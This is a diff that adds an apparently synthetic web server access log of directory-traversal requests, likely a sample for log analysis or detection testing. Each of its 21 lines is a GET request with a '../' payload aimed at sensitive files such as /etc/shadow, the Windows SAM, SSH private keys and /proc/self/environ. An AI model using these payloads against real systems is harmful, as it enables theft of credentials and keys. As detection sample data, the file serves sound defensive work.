@@ -1,0 +1,26 @@
+# Programmer Name : MD ABU SAYED SHUVO
+# Program Name    : advanced_dir_traversal_log.txt
+# Description     : Log sample or text resource
+# First Commit Date: Sunday,21-Jun-2026
+# Last Commit Date : Sunday,21-Jun-2026
+192.168.3.100 - - [19/Jun/2026:10:15:23 +0800] "GET /file.php?path=../../etc/passwd HTTP/1.1" 200 1234
+192.168.3.101 - - [19/Jun/2026:10:16:45 +0800] "GET /download.php?file=../../etc/shadow HTTP/1.1" 200 5678
+192.168.3.102 - - [19/Jun/2026:10:18:12 +0800] "GET /image.php?src=../../../windows/system32/config/sam HTTP/1.1" 200 2345
+192.168.3.103 - - [19/Jun/2026:10:20:33 +0800] "GET /document.php?doc=../../boot.ini HTTP/1.1" 200 3456
+192.168.3.104 - - [19/Jun/2026:10:22:15 +0800] "GET /config.php?file=../../win.ini HTTP/1.1" 200 4567
+192.168.3.105 - - [19/Jun/2026:10:24:56 +0800] "GET /view.php?path=../../../etc/hosts HTTP/1.1" 200 5678
+192.168.3.106 - - [19/Jun/2026:10:26:34 +0800] "GET /read.php?file=../../root/.ssh/authorized_keys HTTP/1.1" 200 6789
+192.168.3.107 - - [19/Jun/2026:10:28:12 +0800] "GET /access.php?path=../../../home/user/.ssh/id_rsa HTTP/1.1" 200 7890
+192.168.3.108 - - [19/Jun/2026:10:30:45 +0800] "GET /file.php?path=../../proc/self/environ HTTP/1.1" 200 8901
+192.168.3.109 - - [19/Jun/2026:10:32:23 +0800] "GET /download.php?file=../../../var/log/apache2/access.log HTTP/1.1" 200 9012
+192.168.3.110 - - [19/Jun/2026:10:34:56 +0800] "GET /image.php?src=../../usr/bin/passwd HTTP/1.1" 200 1234
+192.168.3.111 - - [19/Jun/2026:10:36:34 +0800] "GET /document.php?doc=../../../etc/group HTTP/1.1" 200 2345
+192.168.3.112 - - [19/Jun/2026:10:38:12 +0800] "GET /view.php?path=../../etc/sudoers HTTP/1.1" 200 3456
+192.168.3.113 - - [19/Jun/2026:10:40:45 +0800] "GET /file.php?path=../../../etc/apache2/apache2.conf HTTP/1.1" 200 4567
+192.168.3.114 - - [19/Jun/2026:10:42:23 +0800] "GET /download.php?file=../../etc/nginx/nginx.conf HTTP/1.1" 200 5678
+192.168.3.115 - - [19/Jun/2026:10:44:56 +0800] "GET /image.php?src=../../../etc/mysql/my.cnf HTTP/1.1" 200 6789
+192.168.3.116 - - [19/Jun/2026:10:46:34 +0800] "GET /document.php?doc=../../var/www/html/config.php HTTP/1.1" 200 7890
+192.168.3.117 - - [19/Jun/2026:10:48:12 +0800] "GET /view.php?path=../../../etc/ssh/sshd_config HTTP/1.1" 200 8901
+192.168.3.118 - - [19/Jun/2026:10:50:45 +0800] "GET /file.php?path=../../etc/crontab HTTP/1.1" 200 9012
+192.168.3.119 - - [19/Jun/2026:10:52:23 +0800] "GET /download.php?file=../../../etc/fstab HTTP/1.1" 200 1234
+192.168.3.120 - - [19/Jun/2026:10:54:56 +0800] "GET /image.php?src=../../etc/hosts.allow HTTP/1.1" 200 2345
